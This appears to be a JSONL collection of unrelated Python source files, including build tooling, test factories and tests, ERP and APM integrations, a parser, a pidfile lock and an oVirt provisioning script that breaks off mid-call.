{"text": "#!/usr/bin/env python\n# Copyright 2014 The Chromium Authors. All rights reserved.\n# Use of this source code is governed by a BSD-style license that can be\n# found in the LICENSE file.\n\n\"\"\"Prints information from master_site_config.py\n\nThe sole purpose of this program it to keep the crap inside build/ while\nwe're moving to the new infra/ repository. By calling it, you get access\nto some information contained in master_site_config.py for a given master,\nas a json string.\n\nInvocation: runit.py get_master_config.py --master-name <master name>\n\"\"\"\n\nimport argparse\nimport inspect\nimport json\nimport logging\nimport os\nimport sys\n\nSCRIPT_DIR = os.path.abspath(os.path.dirname(__file__))\n# Directory containing build/\nROOT_DIR = os.path.dirname(os.path.dirname(os.path.dirname(SCRIPT_DIR)))\nassert os.path.isdir(os.path.join(ROOT_DIR, 'build')), \\\n       'Script may have moved in the hierarchy'\n\nLOGGER = logging\n\n\ndef get_master_directory(master_name):\n  \"\"\"Given a master name, returns the full path to the corresponding directory.\n\n  This function either returns a path to an existing directory, or None.\n  \"\"\"\n  if master_name.startswith('master.'):\n    master_name = master_name[7:]\n\n  # Look for the master directory\n  for build_name in ('build', 'build_internal'):\n    master_path = os.path.join(ROOT_DIR,\n                               build_name,\n                               'masters',\n                               'master.' + master_name)\n\n    if os.path.isdir(master_path):\n      return master_path\n  return None\n\n\ndef read_master_site_config(master_name):\n  \"\"\"Return a dictionary containing master_site_config\n\n  master_name: name of master whose file to parse\n\n  Return: dict (empty dict if there is an error)\n  {'master_port': int()}\n  \"\"\"\n  master_path = get_master_directory(master_name)\n\n  if not master_path:\n    LOGGER.error('full path for master cannot be determined')\n    return {}\n\n  master_site_config_path = os.path.join(master_path, 'master_site_config.py')\n\n  if not os.path.isfile(master_site_config_path):\n    LOGGER.error('no master_site_config.py file found in %s' % master_path)\n    return {}\n\n  local_vars = {}\n  try:\n    execfile(master_site_config_path, local_vars)\n  except Exception:  # pylint: disable=W0703\n    # Naked exceptions are banned by the style guide but we are\n    # trying to be resilient here.\n    LOGGER.exception(\"exception occured when exec'ing %s\"\n                     % master_site_config_path)\n    return {}\n\n  for _, symbol in local_vars.iteritems():\n    if inspect.isclass(symbol):\n      if not hasattr(symbol, 'master_port'):\n        continue\n\n      config = {'master_port': symbol.master_port}\n      for attr in ('project_name', 'slave_port', 'master_host',\n                   'master_port_alt', 'buildbot_url'):\n        if hasattr(symbol, attr):\n          config[attr] = getattr(symbol, attr)\n      return config\n\n  LOGGER.error('No master port found in %s' % master_site_config_path)\n  return {}\n\n\ndef get_options(argv):\n  parser = argparse.ArgumentParser()\n  parser.add_argument('--master-name', required=True)\n\n  return parser.parse_args(argv)\n\n\ndef main():\n  options = get_options(sys.argv[1:])\n  config = read_master_site_config(options.master_name)\n  print json.dumps(config, indent=2, sort_keys=True)\n  return 0\n\n\nif __name__ == '__main__':\n  sys.exit(main())\n"}
{"text": "# Copyright 2016, 2019 John J. Rofrano. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# https://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"\nTest Factory to make fake objects for testing\n\"\"\"\nimport factory\nfrom factory.fuzzy import FuzzyChoice\nfrom service.models import Pet, Gender\n\n\nclass PetFactory(factory.Factory):\n    \"\"\"Creates fake pets that you don't have to feed\"\"\"\n\n    class Meta:\n        model = Pet\n\n    id = factory.Sequence(lambda n: n)\n    name = factory.Faker(\"first_name\")\n    category = FuzzyChoice(choices=[\"dog\", \"cat\", \"bird\", \"fish\"])\n    available = FuzzyChoice(choices=[True, False])\n    gender = FuzzyChoice(choices=[Gender.Male, Gender.Female, Gender.Unknown])\n"}
{"text": "class BaseTextView(object):\n    \"\"\"\n    Api is as in gtk.TextView, additional here\n    \"\"\"\n    has_syntax_highlighting = False\n    _doctype = None\n    \n    def get_doctype(self):\n        \"\"\"\n        Returns the pida.core.doctype.DocType object assigned to this\n        view\n        \"\"\"\n        return self._doctype\n\n    def set_doctype(self, doctype):\n        \"\"\"\n        Sets the doctype for this View\n\n        @param doctype: pida.core.doctypes.DocType instance\n        \"\"\"\n        self._doctype = doctype\n\n    def set_syntax_highlight(self, status):\n        \"\"\"\n        Sets the syntax highlighting on/off\n        \"\"\"\n        pass\n\n    def get_syntax_highlight(self):\n        \"\"\"\n        Returns the status of the syntax highlighting\n        \"\"\"\n        return None\n\n    def set_show_line_numbers(self, value):\n        \"\"\"\n        Sets if the line numbers should be shown\n        \"\"\"\n        pass\n\n    def get_show_line_numbers(self):\n        \"\"\"\n        Sets if the line numbers should be shown\n        \"\"\"\n        return False"}
{"text": "import crypt\nimport random\nimport time\nfrom django.db import transaction\nfrom sso.services import BaseDBService\nfrom django.conf import settings\n\nclass MiningBuddyService(BaseDBService):\n    \"\"\"\n    Mining Buddy Class, allows registration and sign-in\n\n    \"\"\"\n\n    settings = { 'require_user': False,\n                 'require_password': False,\n                 'provide_login': False,\n                 'use_auth_username': False,\n                 'database_name': 'dreddit_mining', \n                 'password_salt': 's98ss7fsc7fd2rf62ctcrlwztstnzve9toezexcsdhfgviuinusxcdtsvbrg' }\n\n\n    SQL_ADD_USER = r\"INSERT INTO users (username, password, email, emailvalid, confirmed, rank) VALUES (%s, %s, %s, 1, 1, 2)\"\n    SQL_ADD_API = r\"INSERT INTO api_keys (userid, time, apiID, apiKey, api_valid, charid) values (%s, %s, %s, %s, 1, %s)\"\n    SQL_DIS_USER = r\"UPDATE users SET canLogin = 0 WHERE username = %s\"\n    SQL_ENABLE_USER = r\"UPDATE users SET canLogin = 1, password = %s WHERE username = %s\"\n    SQL_CHECK_USER = r\"SELECT username from users WHERE username = %s and deleted = 0\"\n    SQL_DEL_USER = r\"UPDATE users set deleted = 1 WHERE username = %s\"\n\n    def _gen_salt(self):\n        return self.settings['password_salt']\n\n    def _gen_mb_hash(self, password, salt=None):\n        if not salt:\n            salt = self._gen_salt()\n        return crypt.crypt(password, salt)\n\n    def _clean_username(self, username):\n        username = username.strip()\n        return username\n\n    def add_user(self, username, password, **kwargs):\n        \"\"\" Add a user \"\"\"\n        pwhash = self._gen_mb_hash(password)\n        if 'user' in kwargs:\n            email = kwargs['user'].email\n        else:\n            email = ''\n\n        self.dbcursor.execute(self.SQL_ADD_USER, [self._clean_username(username), pwhash, email])\n\n        userid = self.dbcursor.lastrowid\n        api = kwargs['character'].eveaccount_set.all()[0]\n        self.dbcursor.execute(self.SQL_ADD_API, [userid, int(time.time()), api.api_user_id, api.api_key, kwargs['character'].id])\n\n        return { 'username': self._clean_username(username), 'password': password }\n\n    def check_user(self, username):\n        \"\"\" Check if the username exists \"\"\"\n        self.dbcursor.execute(self.SQL_CHECK_USER, [self._clean_username(username)])\n        row = self.dbcursor.fetchone()\n        if row:\n            return True        \n        return False\n\n    def delete_user(self, uid):\n        \"\"\" Delete a user \"\"\"\n        self.dbcursor.execute(self.SQL_DEL_USER, [uid])\n        return True\n\n    def disable_user(self, uid):\n        \"\"\" Disable a user \"\"\"\n        self.dbcursor.execute(self.SQL_DIS_USER, [uid])\n        return True\n\n    def enable_user(self, uid, password):\n        \"\"\" Enable a user \"\"\"\n        pwhash = self._gen_mb_hash(password)\n        self.dbcursor.execute(self.SQL_ENABLE_USER, [pwhash, uid])\n        return True\n\n    def reset_password(self, uid, password):\n        \"\"\" Reset the user's password \"\"\"\n        return self.enable_user(uid, password)\n        \n\nServiceClass = 'MiningBuddyService'\n"}
{"text": "#-------------------------------------------------------------------------------\n#\n#  Define classes for (uni/multi)-variate kernel density estimation.\n#\n#  Currently, only Gaussian kernels are implemented.\n#\n#  Written by: Robert Kern\n#\n#  Date: 2004-08-09\n#\n#  Modified: 2005-02-10 by Robert Kern.\n#              Contributed to Scipy\n#            2005-10-07 by Robert Kern.\n#              Some fixes to match the new scipy_core\n#\n#  Copyright 2004-2005 by Enthought, Inc.\n#\n#-------------------------------------------------------------------------------\n\nfrom __future__ import division\n\nfrom numpy import atleast_2d, reshape, zeros, newaxis, dot, exp, pi, sqrt, power, sum, linalg\nimport numpy as np\n\n\n\nclass gaussian_kde(object):\n    def __init__(self, dataset):\n        self.dataset = atleast_2d(dataset)\n        if not self.dataset.size > 1:\n            raise ValueError(\"`dataset` input should have multiple elements.\")\n\n        self.d, self.n = self.dataset.shape\n        self._compute_covariance()\n\n    def evaluate(self, points):\n        points = atleast_2d(points)\n\n        d, m = points.shape\n        if d != self.d:\n            if d == 1 and m == self.d:\n                # points was passed in as a row vector\n                points = reshape(points, (self.d, 1))\n                m = 1\n            else:\n                msg = \"points have dimension %s, dataset has dimension %s\" % (d,\n                    self.d)\n                raise ValueError(msg)\n\n        result = zeros((m,), dtype=np.float)\n\n        if m >= self.n:\n            # there are more points than data, so loop over data\n            for i in range(self.n):\n                diff = self.dataset[:, i, newaxis] - points\n                tdiff = dot(self.inv_cov, diff)\n                energy = sum(diff*tdiff,axis=0) / 2.0\n                result = result + exp(-energy)\n        else:\n            # loop over points\n            for i in range(m):\n                diff = self.dataset - points[:, i, newaxis]\n                tdiff = dot(self.inv_cov, diff)\n                energy = sum(diff * tdiff, axis=0) / 2.0\n                result[i] = sum(exp(-energy), axis=0)\n\n        result = result / self._norm_factor\n\n        return result\n\n    __call__ = evaluate\n\n\n    def scotts_factor(self):\n        return power(self.n, -1./(self.d+4))\n\n    def _compute_covariance(self):\n        self.factor = self.scotts_factor()\n        # Cache covariance and inverse covariance of the data\n        if not hasattr(self, '_data_inv_cov'):\n            self._data_covariance = atleast_2d(np.cov(self.dataset, rowvar=1,\n                                               bias=False))\n            self._data_inv_cov = linalg.inv(self._data_covariance)\n\n        self.covariance = self._data_covariance * self.factor**2\n        self.inv_cov = self._data_inv_cov / self.factor**2\n        self._norm_factor = sqrt(linalg.det(2*pi*self.covariance)) * self.n\n\n\nif __name__ == '__main__':\n    from biorpy import r\n    from scipy import stats\n    values = np.concatenate([np.random.normal(size=20), np.random.normal(loc=6, size=30)])\n\n    kde = stats.gaussian_kde(values)\n    x = np.linspace(-5,10, 50)\n    y = kde(x)\n    print y\n    r.plot(x, y, type=\"l\", col=\"red\")\n\n\n    kde2 = gaussian_kde(values)\n    y2 = kde2(x)\n    r.lines(x, y2, col=\"blue\", lty=2)\n\n    raw_input(\"\")\n\n\n\n"}
{"text": "import httpretty\nimport unittest\nfrom os import path\nimport types\nimport sys\nimport requests\nfrom yaaHN.models import item\nfrom yaaHN import hn_client\nfrom yaaHN.helpers import item_parser, API_BASE\nfrom test_utils import get_content, PRESET_DIR\n\n\nclass TestItem(unittest.TestCase):\n\n    def setUp(self):\n        httpretty.HTTPretty.enable()\n        httpretty.register_uri(\n            httpretty.GET, '{0}{1}'.format(API_BASE,\n                                           'item/8863.json'),\n            body=get_content('item_8863.json'), status=200, content_type='text/json')\n        response = requests.get(\n            'https://hacker-news.firebaseio.com/v0/item/8863.json')\n\n        self.item_type = ['pollopt', 'poll', 'comment', 'story', 'job']\n        self.item = hn_client.get_item('8863')\n\n    def tearDown(self):\n        httpretty.HTTPretty.disable()\n\n    def test_item_data_type(self):\n        \"\"\"\n        Test types of fields of a Item object\n        \"\"\"\n        assert type(self.item.id) == int\n        assert type(self.item.deleted) == types.NoneType\n        assert self.item.type in self.item_type\n        assert type(self.item.by) == types.UnicodeType\n        assert type(self.item.time) == int\n        assert type(self.item.text) == types.NoneType\n        assert type(self.item.dead) == types.NoneType\n        assert type(self.item.parent) == types.NoneType\n        assert type(self.item.kids) == types.ListType\n        assert type(self.item.url) == types.UnicodeType\n        assert type(self.item.score) == types.IntType\n        assert type(self.item.title) == types.UnicodeType\n        assert type(self.item.parts) == types.NoneType\n\n    def test_item_by(self):\n        \"\"\"\n        Tests the submitter name\n        \"\"\"\n        self.assertEqual(self.item.by, 'dhouston')\n\n\nif __name__ == '__main__':\n    unittest.main()\n"}
{"text": "# -*- coding: utf-8 -*-\n###############################################################################\n#\n#    Copyright (C) 2001-2014 Micronaet SRL (<http://www.micronaet.it>).\n#\n#    Original module for stock.move from:\n#    OpenERP, Open Source Management Solution\n#    Copyright (C) 2004-2010 Tiny SPRL (<http://tiny.be>).\n#\n#    This program is free software: you can redistribute it and/or modify\n#    it under the terms of the GNU Affero General Public License as published\n#    by the Free Software Foundation, either version 3 of the License, or\n#    (at your option) any later version.\n#\n#    This program is distributed in the hope that it will be useful,\n#    but WITHOUT ANY WARRANTY; without even the implied warranty of\n#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n#    GNU Affero General Public License for more details.\n#\n#    You should have received a copy of the GNU Affero General Public License\n#    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n#\n###############################################################################\n\nimport os\nimport sys\nimport logging\nimport openerp\nimport openerp.netsvc as netsvc\nimport openerp.addons.decimal_precision as dp\nfrom openerp.osv import fields, osv, expression, orm\nfrom datetime import datetime, timedelta\nfrom dateutil.relativedelta import relativedelta\nfrom openerp import SUPERUSER_ID\nfrom openerp import tools\nfrom openerp.tools.translate import _\nfrom openerp.tools.float_utils import float_round as round\nfrom openerp.tools import (DEFAULT_SERVER_DATE_FORMAT, \n    DEFAULT_SERVER_DATETIME_FORMAT, \n    DATETIME_FORMATS_MAP, \n    float_compare)\n\n\n_logger = logging.getLogger(__name__)\n\n\ndiscount_type = [\n    ('integrated', 'Integrate'),\n    ('inline', 'Inline'),\n    ('row', 'Different row'),\n    ]\n    \nclass ResPartner(orm.Model):\n    ''' Extra elemtent for manage discount\n    '''    \n    _inherit = 'res.partner'\n\n    def onchange_discount(self, cr, uid, ids, discount_scale, discount, \n            mode='scale', context=None):\n        ''' Update discount depend on scale (or reset scale)\n        '''\n        res = {'value': {}}\n        try:\n            if mode == 'scale':\n                scale = discount_scale.split('+')\n                discount_scale_cleaned = ''      \n                rate = 100.0\n                for i in scale:\n                    i = float(i.strip().replace('%', '').replace(',', '.'))\n                    rate -= rate * i / 100.0                \n                    discount_scale_cleaned += \"%s%5.2f%s \" % (\n                        '+' if discount_scale_cleaned else '', i, '%')\n                res['value']['discount'] = 100.0 - rate\n                res['value']['discount_scale'] = discount_scale_cleaned\n\n            else: # 'discount':\n                pass #res['value']['discount_scale'] = False\n        except:\n            res['warning'] = {\n                'title': _('Discount error'), \n                'message': _('Scale value not correct!'),\n                }\n        return res        \n        \n    _columns = {\n        'discount_type': fields.selection(discount_type, 'Discount type'),\n        'discount_scale': fields.char('Discount scale', size=35),\n        'discount': fields.float('Discount', digits=(\n            16, 2), help='Automated calculate if scale is indicated'), \n        }\n    \n    _defaults = {\n        'discount_type': lambda *x: 'integrated',\n        }    \n\nclass SaleOrderLine(orm.Model):\n    ''' Add agent commission\n    '''    \n    _inherit = 'sale.order.line'\n\n    def onchange_discount(self, cr, uid, ids, discount_scale, discount, \n            mode='scale', context=None):\n        ''' Call onchange in partner\n        '''    \n        return self.pool.get('res.partner').onchange_discount(cr, uid, ids, \n            discount_scale=discount_scale, discount=discount, mode=mode, \n            context=context)\n\n\n    _columns = {\n        'discount_type': fields.selection(discount_type, 'Discount type'),\n        'discount_scale': fields.char('Discount scale', size=15),\n        }\n\n    _defaults = {\n        'discount_type': lambda *x: 'integrated',\n        }    \n        \n"}
{"text": "#  BSD 3-Clause License\n#\n#  Copyright (c) 2019, Elasticsearch BV\n#  All rights reserved.\n#\n#  Redistribution and use in source and binary forms, with or without\n#  modification, are permitted provided that the following conditions are met:\n#\n#  * Redistributions of source code must retain the above copyright notice, this\n#    list of conditions and the following disclaimer.\n#\n#  * Redistributions in binary form must reproduce the above copyright notice,\n#    this list of conditions and the following disclaimer in the documentation\n#    and/or other materials provided with the distribution.\n#\n#  * Neither the name of the copyright holder nor the names of its\n#    contributors may be used to endorse or promote products derived from\n#    this software without specific prior written permission.\n#\n#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n#  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n#  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n#  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n#  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n#  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n#  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\nimport aiohttp\n\nimport elasticapm\nfrom elasticapm import Client\n\n\nclass ElasticAPM:\n    def __init__(self, app, client=None):\n        if not client:\n            config = app.get(\"ELASTIC_APM\", {})\n            config.setdefault(\"framework_name\", \"aiohttp\")\n            config.setdefault(\"framework_version\", aiohttp.__version__)\n            client = Client(config=config)\n        self.app = app\n        self.client = client\n        self.install_tracing(app, client)\n\n    def install_tracing(self, app, client):\n        from elasticapm.contrib.aiohttp.middleware import tracing_middleware\n\n        app.middlewares.insert(0, tracing_middleware(app))\n        if client.config.instrument and client.config.enabled:\n            elasticapm.instrument()\n"}
{"text": "from __future__ import unicode_literals\n\ntry:\n    from html import escape\n    from html.parser import HTMLParser\nexcept ImportError:\n    from cgi import escape\n    from HTMLParser import HTMLParser\n\nfrom wtforms.meta import DefaultMeta\nfrom wtforms.widgets.core import HTMLString\n\n\nclass PolyglotHTMLParser(HTMLParser):\n    \"\"\"This simplified ``HTMLParser`` converts its input to polyglot HTML.\n\n    It works by making sure that stand-alone tags like ``<input>`` have a\n    slash before the closing angle bracket, that attribute values are always\n    quoted, and that boolean attributes have their value set to the attribute\n    name (e.g., ``checked=\"checked\"``).\n\n    Note: boolean attributes are simply identified as attributes with no value\n    at all.  Specifically, an attribute with an empty string (e.g.,\n    ``checked=\"\"``) will *not* be identified as boolean attribute, i.e., there\n    is no semantic intelligence involved.\n\n    >>> parser = PolyglotHTMLParser()\n    >>> parser.feed('''<input type=checkbox name=foo value=y checked>''')\n    >>> print(parser.get_output())\n    <input type=\"checkbox\" name=\"foo\" value=\"y\" checked=\"checked\" />\n\n    \"\"\"\n\n    def __init__(self):\n        HTMLParser.__init__(self)\n        self.reset()\n        self.output = []\n\n    def html_params(self, attrs):\n        output = []\n        for key, value in attrs:\n            if value is None:\n                value = key\n            output.append(' {}=\"{}\"'.format(key, escape(value, quote=True)))\n        return ''.join(output)\n\n    def handle_starttag(self, tag, attrs):\n        if tag == 'input':\n            return self.handle_startendtag(tag, attrs)\n        self.output.append('<{}{}>'.format(tag, self.html_params(attrs)))\n\n    def handle_endtag(self, tag):\n        self.output.append('</{}>'.format(tag))\n\n    def handle_startendtag(self, tag, attrs):\n        self.output.append('<{}{} />'.format(tag, self.html_params(attrs)))\n\n    def handle_data(self, data):\n        self.output.append(data)\n\n    def handle_entityref(self, name):\n        self.output.append('&{};'.format(name))\n\n    def handle_charref(self, name):\n        self.output.append('&#{};'.format(name))\n\n    def get_output(self):\n        return ''.join(self.output)\n\n\nclass PolyglotMeta(DefaultMeta):\n    \"\"\"\n    This meta class works exactly like ``DefaultMeta``, except that fields of\n    forms using this meta class will output polyglot markup.\n    \"\"\"\n\n    def render_field(self, field, render_kw):\n        \"\"\"\n        Render a widget, and convert its output to polyglot HTML.\n        \"\"\"\n        other_kw = getattr(field, 'render_kw', None)\n        if other_kw is not None:\n            render_kw = dict(other_kw, **render_kw)\n        html = field.widget(field, **render_kw)\n        parser = PolyglotHTMLParser()\n        parser.feed(html)\n        output = HTMLString(parser.get_output())\n        return output\n"}
{"text": "import sys\nimport os\nimport numpy as np\nimport pandas as pd\npd.options.mode.chained_assignment = None\n\nfrom fax_production_process import ProductionProcess\nimport hax\n\n\nclass BuildMiniTree(ProductionProcess):\n    '''Run hax to create minitree'''\n\n    process_oerder = 5\n    __version__ = '0.0.1'\n\n    def _check(self):\n        return os.path.isfile('{minitree_pickle_path}/{production_id}.h5'.format(minitree_pickle_path=self.config['DIRECTORY']['minitree_pickle'], production_id=self.production_id))\n\n    def hax_init(self, force_reload=False):\n        self.main_data_path = self.config['DIRECTORY']['processed']\n        self.minitree_path = self.config['DIRECTORY']['minitree']\n\n        # Trick learned from Daniel Coderre's DAQVeto lichen\n        if (not len(hax.config)) or force_reload:\n            # User didn't init hax yet... let's do it now\n            hax.init(experiment='XENON1T',\n                     main_data_paths=[self.main_data_path],\n                     minitree_paths=[self.minitree_path],\n                     version_policy='loose'\n                     )\n\n        elif not (self.main_data_path in hax.config['main_data_paths']):\n            hax.config['main_data_paths'] = ['.', self.main_data_path]\n\n        elif not (self.minitree_path == hax.config['minitree_paths'][0]):\n            hax.config['minitree_paths'] = [self.minitree_path]\n\n    def _process(self):\n        self.hax_init(force_reload=False)\n        self.minitree_pickle_path = self.config['DIRECTORY']['minitree_pickle']\n\n        with self._divert_stdout():\n            self.df = hax.minitrees.load(\n                self.production_id, ['Basics', 'Fundamentals'])\n            self.df.to_hdf(os.path.join(\n                self.minitree_pickle_path, '{name}.h5'.format(name=self.production_id)), 'table')\n            print('{production_id} minitrees building success :)'.format(\n                production_id=self.production_id))\n"}
{"text": "from Tokenizer import Tokenizer\n\n\nclass Parser:\n    def __init__(self, input_content, file=True, debug=False):\n        self.tokenizer = Tokenizer(input_content, file)\n        self.tokenizer.tokenize()\n        self.token = None\n        self.is_debug = debug\n        self.pos = 0\n        self.info = []\n        self.debug = []\n        self.eps = False\n\n    def take_token(self, token_type_list, eps=False):\n        self.eps = False\n        self.token = self.next_token()\n        if self.is_debug:\n            print(self.token)\n        if self.token.type not in token_type_list:\n            if eps:\n                self.token = self.prev_token()\n                self.eps = True\n                if self.is_debug:\n                    print(self.eps)\n                return 'EPS'\n            else:\n                self.raise_error(\n                    \"Unexpected token: %s at '%s' on line %d column %d; Expected one of %s\"\n                    % (self.token.type, self.token.value, self.token.line, self.token.column, str(token_type_list))\n                )\n        return self.token\n\n    def take_tokens(self, token_type_list):\n        for token_type in token_type_list:\n            self.take_token(token_type)\n\n    def prev_token(self):\n        self.pos -= 1\n        return self.tokenizer.tokens[self.pos - 1]\n\n    def next_token(self):\n        self.pos += 1\n        return self.tokenizer.tokens[self.pos - 1]\n\n    @staticmethod\n    def raise_error(msg='Unexpected error occurred'):\n        raise RuntimeError('Parser error; %s' % msg)\n\n    def log_info(self, stmt):\n        self.info.append(stmt + ' - OK')\n        if self.is_debug:\n            print(self.info[-1])\n\n    def log_debug(self, stmt):\n        self.debug.append(stmt)\n        if self.is_debug:\n            print(stmt)\n\n    def reset(self):\n        self.pos = 0\n        self.info = []\n        self.debug = []\n        self.eps = False\n\n    def parse(self):\n        self.reset()\n        self.start()\n        return\n\n    def start(self):\n        # self.next_token()\n        self.x_elems()\n        return\n\n    # noinspection SpellCheckingInspection\n    def x_elems(self):\n        self.log_debug('x_elems')\n        self.take_token(['ANCHOR_OP', 'VAR_NAME', 'EOF'])\n        if self.token.type == 'EOF':\n            return\n        else:\n            self.x_elem()\n        self.x_elems()\n\n    def x_elem(self):\n        self.log_debug('x_elem')\n        if self.token.type == 'ANCHOR_OP':\n            self.x_style()\n        elif self.token.type == 'VAR_NAME':\n            self.x_var_def()\n        else:\n            self.raise_error()\n\n    def x_style(self):\n        self.log_debug('x_style')\n        self.x_items()\n        self.log_info('style')\n\n    def x_items(self):\n        self.log_debug('x_items')\n        eps = self.take_token(['VAR_NAME', 'STRING', 'ANCHOR_OP', 'ANCHOR_CLOSE'], eps=True)\n        if eps == 'EPS':\n            return\n        elif self.token.type == 'VAR_NAME':\n            self.x_var_def()\n        elif self.token.type == 'STRING':\n            self.take_token(['COLON'])\n            self.x_value()\n            self.x_properties()\n            self.take_token(['SEMICOLON'])\n        elif self.token.type == 'ANCHOR_OP':\n            self.x_style()\n        elif self.token.type == 'ANCHOR_CLOSE':\n            return\n        else:\n            self.raise_error()\n        self.log_info('items')\n        self.x_items()\n\n    def x_properties(self):\n        self.log_debug('x_properties')\n        self.x_value(True)\n        if self.eps:\n            return\n        else:\n            self.x_properties()\n\n    def x_var_def(self):\n        self.log_debug('x_var_def')\n        self.take_token(['COLON'])\n        self.x_value()\n        self.take_token(['SEMICOLON'])\n        self.log_info('var_def')\n\n    def x_value(self, eps_mode=False):\n        self.log_debug('x_value')\n        eps = self.take_token(['CONSTANT', 'STRING', 'VAR_NAME', 'FUNCTION_OP'], eps_mode)\n        if eps_mode and eps == 'EPS':\n            pass\n        elif self.token.type == 'CONSTANT':\n            pass\n        elif self.token.type == 'STRING':\n            pass\n        elif self.token.type == 'FUNCTION_OP':\n            self.x_values()\n            self.take_token(['BRACKET_CLOSE'])\n        elif self.token.type == 'VAR_NAME':\n            pass\n        else:\n            self.raise_error()\n\n    def x_values(self):\n        self.log_debug('x_values')\n        self.x_value(True)\n        eps = self.take_token(['COMMA'], True)\n        if eps == 'EPS':\n            pass\n        else:\n            self.x_values()\n"}
{"text": "# Copyright 2021 UW-IT, University of Washington\n# SPDX-License-Identifier: Apache-2.0\n\nfrom logging import getLogger\nfrom inspect import stack, getmodule\nimport errno\nimport os\n\n\n# modified from:\n# http://stackoverflow.com/questions/1444790/python-module-for-creating-pid-\n# based-lockfile\nclass Pidfile():\n    def __init__(self, path=None, directory='/tmp', filename=None,\n                 logger=None):\n        caller = getmodule(stack()[1][0]).__name__\n        if path:\n            self.pidfile = path\n        else:\n            if not filename:\n                filename = caller.split('.')[-1]\n\n            self.pidfile = '{}/{}.pid'.format(directory, filename)\n\n        self.logger = logger if logger else getLogger(caller)\n\n    def __enter__(self):\n        try:\n            self._create()\n        except OSError as e:\n            if e.errno == errno.EEXIST:\n                pid = self._check()\n                if pid:\n                    self.pidfd = None\n                    msg = 'process already running pid = {} ({})'.format(\n                        pid, self.pidfile)\n                    self.logger.info(msg)\n                    raise ProcessRunningException(msg)\n                else:\n                    os.remove(self.pidfile)\n                    self.logger.info('removed stale lockfile {}'.format(\n                        self.pidfile))\n                    self._create()\n            else:\n                raise\n\n        os.write(self.pidfd, str(os.getpid()).encode('utf-8'))\n        os.close(self.pidfd)\n        return self\n\n    def __exit__(self, t, e, tb):\n        # return false to raise, true to pass\n        if t is None:\n            # normal condition, no exception\n            self._remove()\n            return True\n        elif t is ProcessRunningException:\n            # do not remove the other process lockfile\n            return False\n        else:\n            # other exception\n            if self.pidfd:\n                # this was our lockfile, removing\n                self._remove()\n            return False\n\n    def _create(self):\n        self.pidfd = os.open(self.pidfile,\n                             os.O_CREAT | os.O_WRONLY | os.O_EXCL)\n\n    def _remove(self):\n        os.remove(self.pidfile)\n\n    def _check(self):\n        \"\"\"\n        check if a process is still running\n        the process id is expected to be in pidfile, which should exist.\n        if it is still running, returns the pid, if not, return False.\n        \"\"\"\n        with open(self.pidfile, 'r') as f:\n            try:\n                pid = int(f.read())\n                os.kill(pid, 0)\n                return pid\n            except ValueError:\n                self.logger.error('bad pid: {}'.format(pidstr))\n            except OSError:\n                self.logger.error('cannot deliver signal to {}'.format(pid))\n\n            return False\n\n\nclass ProcessRunningException(Exception):\n    pass\n"}
{"text": "import ovlib\nfrom ovlib.eventslib import event_waiter, EventsCode\n\nmac_pool = context.macpools.get(\"Default\")\n\ntry:\n    dc = context.datacenters.get(host_name)\nexcept ovlib.OVLibErrorNotFound:\n    dc = context.datacenters.add(data_center={'name': host_name, 'local': True, 'storage_format': 'V4', 'mac_pool': mac_pool})\n\ndc_net_vlan = set()\ndc_nets_id = set()\n\nfor net in dc.networks.list():\n    if net.vlan is not None:\n        dc_net_vlan.add(net.vlan.id)\n    if net.name == \"ovirtmgmt\" and net.mtu != 9000:\n        net.update(network={'mtu': 9000})\n    dc_nets_id.add(net.id)\n\ntry:\n    cluster = context.clusters.get(host_name)\nexcept ovlib.OVLibErrorNotFound:\n    cluster = context.clusters.add(cluster={'name': host_name, 'cpu': {'type': 'AMD Opteron G3'}, 'data_center': dc, 'mac_pool': mac_pool})\n\nfuturs = []\nfor (name, vlan) in ((\"VLAN1\", 1), (\"VLAN2\", 2), ('VLAN3', 3)):\n    if not vlan in dc_net_vlan:\n        new_net = context.networks.add(network={'name': name, 'vlan': {'id': \"%d\" % vlan} , 'mtu': 9000, 'data_center': dc, 'usages': ['VM'],\n                                          }, wait= False)\n        futurs.append(new_net)\n\nfor f in futurs:\n    network = f.wait()\n    dc_nets_id.add(network.id)\n\ncluster_nets_id = set()\n\nfor net in cluster.networks.list():\n    cluster_nets_id.add(net.id)\n\nfuturs = []\nfor missing in dc_nets_id - cluster_nets_id:\n    futurs.append(cluster.networks.add(network={'id': missing, 'required': False}, wait=False))\n\ntry:\n    host = context.hosts.get(host_name)\nexcept ovlib.OVLibErrorNotFound:\n    events_returned = []\n    waiting_events = [EventsCode.VDS_DETECTED]\n    with event_waiter(context, \"host.name=%s\" % host_name, events_returned, verbose=True, break_on=waiting_events):\n        host = context.hosts.add(host={\n            'name': host_name, 'address': host_name,\n            'cluster': cluster,\n            'override_iptables': False,\n            'ssh': {'authentication_method': 'PUBLICKEY'},\n            'power_management': {\n                'enabled': True,\n                'kdump_detection': False,\n                'pm_proxies': [{'type': 'CLUSTER'}, {'type': 'DC'}, {'type': 'OTHER_DC'}]\n            }\n        }, 